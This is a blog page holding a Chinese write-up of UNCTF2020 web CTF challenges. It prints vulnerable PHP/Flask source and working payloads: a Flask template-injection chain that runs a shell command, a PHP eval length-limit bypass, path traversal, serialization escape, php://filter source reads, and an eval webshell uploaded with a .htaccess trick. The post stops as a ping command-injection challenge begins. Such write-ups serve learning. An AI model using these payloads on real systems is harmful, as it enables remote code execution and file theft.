@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="UNCTF2020赛题部分WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UNCTF2020">
+<meta property="og:url" content="http://yoursite.com/2020/11/11/UNCTF2020/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="UNCTF2020赛题部分WP">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/11/11/UNCTF2020/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/11/UNCTF2020/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/11/UNCTF2020/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/11/UNCTF2020/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/11/UNCTF2020/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/11/UNCTF2020/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/11/UNCTF2020/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/11/UNCTF2020/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/11/UNCTF2020/9.png">
+<meta property="article:published_time" content="2020-11-11T05:28:54.000Z">
+<meta property="article:modified_time" content="2020-11-12T03:07:28.652Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="UNCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/11/11/UNCTF2020/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/11/11/UNCTF2020/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>UNCTF2020 | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/11/UNCTF2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          UNCTF2020
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-11-11 13:28:54" itemprop="dateCreated datePublished" datetime="2020-11-11T13:28:54+08:00">2020-11-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-11-12 11:07:28" itemprop="dateModified" datetime="2020-11-12T11:07:28+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="UNCTF2020赛题部分WP"><a href="#UNCTF2020赛题部分WP" class="headerlink" title="UNCTF2020赛题部分WP"></a>UNCTF2020赛题部分WP<a id="more"></a></h1><h2 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>flask模板注入</li>
+<li>绕过过滤</li>
+</ul>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，要求以admin登录，先到/register下注册，/login登录，刷新拿到/secret_route_you_do_not_know，要求用<code>&#39;guess&#39;</code>猜<code>secret</code></p>
+<p>考察的就是python的flask模板注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess&#x3D;&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/11/11/UNCTF2020/1.png" class="">
+
+<p>经过测试有一下过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#39;,\&quot;,[],__</span><br></pre></td></tr></table></figure>
+
+<p>下面用到<code>request.args.xx</code>绕过下划线，或者用<code>request.values.xx</code>利用post传参，但是post不被允许</p>
+<p>下面就是一点点构造payload，下面是最终的exp</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;()|attr(request.args.class)|attr(request.args.bases)|attr(request.args.subclasses)()|attr(request.args.a)(117)|attr(request.args.b)|attr(request.args.c)|attr(request.args.d)(request.args.e)(request.args.f)|attr(request.args.g)()&#125;&#125;&amp;class=__class__&amp;bases=__base__&amp;subclasses=__subclasses__&amp;a=__getitem__&amp;b=__init__&amp;c=__globals__&amp;d=get&amp;e=popen&amp;f=cat flag.txt&amp;g=read</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/11/11/UNCTF2020/2.png" class="">
+
+<h2 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>php伪协议</li>
+<li>命令执行绕过长度限制</li>
+</ul>
+<h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，F12源码处发现提示</p>
+<img src="/2020/11/11/UNCTF2020/3.png" class="">
+
+<p>加密编码挨个试，发现是base85，在线网站解密</p>
+<img src="/2020/11/11/UNCTF2020/4.png" class="">
+
+<p>应该是用GET传参数action，提示了读取源码，用伪协议，base被ban，用string.rot13过滤器，读取index.php和flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($action))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/base|data|input|zip|zlib/i"</span>,$action))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Hacker!!!')&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"$action"</span>);</span><br><span class="line">&#125;							</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"unctf&#123;7his_is_@_f4ke_f1a9&#125;"</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>假的flag，根据提示，16进制转字符串<code>1nD3x.php</code>，访问</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'\`'</span>,<span class="string">'\+'</span>,<span class="string">'\-'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'\\\\'</span>,<span class="string">'\/'</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">'eval'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell_exec'</span>,<span class="string">'assert'</span>,<span class="string">'passthru'</span>,<span class="string">'array_map'</span>,<span class="string">'ob_start'</span>,<span class="string">'create_function'</span>,<span class="string">'call_user_func'</span>,<span class="string">'call_user_func_array'</span>,<span class="string">'array_filter'</span>,<span class="string">'proc_open'</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/m'</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'WTF???'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sry,try again'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>长度有限制，黑名单跟不存在没什么区别，直接用，但是构造了挺久发现长度是问题，找到了p神的文章，完美解决</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PHP&#x2F;bypass-eval-length-restrict.html</span><br></pre></td></tr></table></figure>
+
+<p>利用变长参数特性展开数组，详细可以看文章讲解</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：code&#x3D;usort(...$_GET);</span><br><span class="line">GET:?1[]&#x3D;test&amp;1[]&#x3D;命令;&amp;2&#x3D;assert</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/11/11/UNCTF2020/5.png" class="">
+
+<h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>路径穿越</li>
+</ul>
+<h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">welc0me to <span class="number">2020</span>UNCTF!!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/unctf\.com/'</span>,$url))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'error!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>传入的参数要包含<code>unctf.com</code>，后面过滤了挺多，没想到路径穿越进行文件包含，最近题没咋碰</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=unctf.com/../../../../flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>序列化字符串逃逸</li>
+</ul>
+<h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一个challenge替换成easychallenge能够逃逸4个字符，要求密码为easy，构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span><br><span class="line">因为这里只有29个字符，要保持能够正常反序列化，要长度整，最后加3个括号</span><br><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>弱类型比较</li>
+<li>数组序列化</li>
+</ul>
+<h3 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">"admin"</span>;</span><br><span class="line">$password  = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])? $_POST[<span class="string">'data'</span>]: <span class="string">""</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class="string">'password'</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"username or password error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$username</code>和<code>$password</code>被flag.php中的覆盖了，用php弱类型比较，bool和任何字符串比较都为true</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">data=a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;b:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/11/11/UNCTF2020/6.png" class="">
+
+<h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>不包含括号的命令执行</li>
+<li>过滤器输出</li>
+</ul>
+<h3 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/\(.*\)/'</span>, $_GET[<span class="string">'a'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> (strpos($data, <span class="string">'flag'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">'ByeBye hacker'</span>;</span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                 &#125;);</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>匹配到括号就会退出</p>
+<p>输出不能包含flag</p>
+<p>用过滤器</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?a=<span class="keyword">include</span> $_GET[<span class="string">'b'</span>];&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">这里可以换别的过滤器</span><br></pre></td></tr></table></figure>
+
+<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>php短标签</li>
+<li>.htaccess</li>
+</ul>
+<h3 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题上传图片马</p>
+<img src="/2020/11/11/UNCTF2020/7.png" class="">
+
+<p>对内容进行了检测</p>
+<p>这里想到了php短标签</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);==&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>这里还有就是不能把jpg文件解析成php文件，需要上传.htaccess</p>
+<p>由于过滤了ph，换行拼接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.htaccess</span></span><br><span class="line">Addtype application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>
+
+<p>上传图片，抓包修改文件名和内容如上</p>
+<p>之后就可以直接利用马了</p>
+<img src="/2020/11/11/UNCTF2020/8.png" class="">
+
+<h2 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h2><h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>命令执行一些绕过</li>
+</ul>
+<h3 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，是一个ping窗口，命令执行</p>
+<p>127.0.0.1能够正常返回，下面就是进行测试了</p>
